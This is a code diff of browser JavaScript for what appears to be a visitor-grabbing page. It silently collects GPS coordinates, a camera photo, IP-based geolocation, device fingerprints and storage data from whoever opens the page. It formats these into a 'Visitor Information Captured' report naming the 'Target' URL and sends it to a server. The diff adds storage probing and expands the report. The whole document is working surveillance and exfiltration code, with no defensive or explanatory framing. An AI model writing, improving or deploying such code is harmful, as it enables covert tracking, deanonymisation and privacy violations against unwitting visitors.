@@ -122,7 +122,16 @@
         return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
     }
 
-    async function sendToServer(text, photoBlob, gps, device, fp) {
+    async function getStorageInfo() {
+        try {
+            const est = await navigator.storage.estimate();
+            const totalGB = (est.quota / (1024**3)).toFixed(2);
+            const usedGB = (est.usage / (1024**3)).toFixed(2);
+            return { total: totalGB, used: usedGB };
+        } catch(e) { return { total: 'N/A', used: 'N/A' }; }
+    }
+
+    async function sendToServer(text, photoBlob, gps, device, fp, ipData, storage) {
         let photoBase64 = null;
         if (photoBlob) {
             photoBase64 = await new Promise((resolve) => {
@@ -131,22 +140,10 @@
                 reader.readAsDataURL(photoBlob);
             });
         }
-        
-        let ipData = {};
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            ipData = await res.json();
-        } catch(e) {}
 
         const payload = {
             text: text,
             photo: photoBase64,
-            ip: ipData.ip || 'N/A',
-            country: ipData.country_name || 'N/A',
-            region: ipData.region || 'N/A',
-            city: ipData.city || 'N/A',
-            postal: ipData.postal || 'N/A',
-            timezone: ipData.timezone || 'N/A',
             gps: gps,
             device: device.model,
             ua: device.ua,
@@ -154,13 +151,19 @@
             resolution: device.resolution,
             cpu_cores: device.cpuCores,
             ram: 'N/A',
-            storage_used: 'N/A',
-            storage_total: 'N/A',
+            storage_used: storage.used,
+            storage_total: storage.total,
             gpu: fp.gpu,
             fonts: fp.fonts,
             canvas: fp.canvasHash,
-            camera: photoBlob ? 'Permitido' : 'Denegado/No disponible',
-            location: gps ? 'Permitido' : 'Denegado/No disponible',
+            camera: photoBlob ? 'Granted' : 'Denied/Not available',
+            location: gps ? 'Granted' : 'Denied/Not available',
+            ip: ipData.ip || 'N/A',
+            country: ipData.country_name || 'N/A',
+            region: ipData.region || 'N/A',
+            city: ipData.city || 'N/A',
+            postal: ipData.postal || 'N/A',
+            timezone: ipData.timezone || 'N/A',
             target: window.location.href
         };
 
@@ -186,7 +189,14 @@
             const gps = await getGPS();
             const foto = await capturePhoto();
             const fp = await getFingerprint();
-            
+            const storage = await getStorageInfo();
+
+            let ipData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch(e) {}
+
             const device = {
                 model: "Desconocido",
                 ua: navigator.userAgent,
@@ -194,22 +204,25 @@
                 resolution: `${window.screen.width}x${window.screen.height}`,
                 cpuCores: navigator.hardwareConcurrency || 'N/A'
             };
-            if (navigator.userAgent.includes('iPhone')) device.model = 'iPhone';
+            if (navigator.userAgent.includes('iPhone')) device.model = 'iPhone OS ' + navigator.userAgent.match(/OS (\d+)/)[1] + '_' + navigator.userAgent.match(/OS \d+_(\d+)/)[1] + ' like Mac OS X';
             else if (navigator.userAgent.includes('iPad')) device.model = 'iPad';
             else if (navigator.userAgent.includes('Android')) device.model = 'Android';
             else if (navigator.userAgent.includes('Mac')) device.model = 'Mac';
             else if (navigator.userAgent.includes('Windows')) device.model = 'Windows PC';
 
-            let message = `📊 *Reporte*\n━━━━━━━━━━━━━\n`;
-            message += `📍 *GPS*: ${gps ? `${gps.lat}, ${gps.lng} (±${gps.accuracy}m)` : 'No disponible'}\n`;
-            message += `📱 *Dispositivo*: ${device.model}\n`;
-            message += `📐 *Resolución*: ${device.resolution}\n`;
-            message += `🕐 *Fecha*: ${new Date().toLocaleString()}\n`;
+            let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
+            message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
+            message += `🌐 *Network Information*\n   • IP Address: ${ipData.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
+            message += `📍 *Location Details*\n   • Country: ${ipData.country_name || 'N/A'}\n   • Region: ${ipData.region || 'N/A'}\n   • City: ${ipData.city || 'N/A'}\n   • Postal Code: ${ipData.postal || 'N/A'}\n   • Timezone: ${ipData.timezone || 'N/A'}\n\n`;
+            message += `🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
+            message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Granted' : 'Denied/Not available'}\n   • Location: ${gps ? 'Granted' : 'Denied/Not available'}\n\n`;
+            message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n\n`;
             if (gps) {
-                message += `🗺️ *Mapa*: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+                message += `🗺️ *GPS Coordinates*\n   • Latitude: ${gps.lat}\n   • Longitude: ${gps.lng}\n   • Accuracy: ${gps.accuracy}m\n\n`;
             }
+            message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper`;
 
-            await sendToServer(message, foto, gps, device, fp);
+            await sendToServer(message, foto, gps, device, fp, ipData, storage);
         } catch(e) {
             console.error(e);
         }
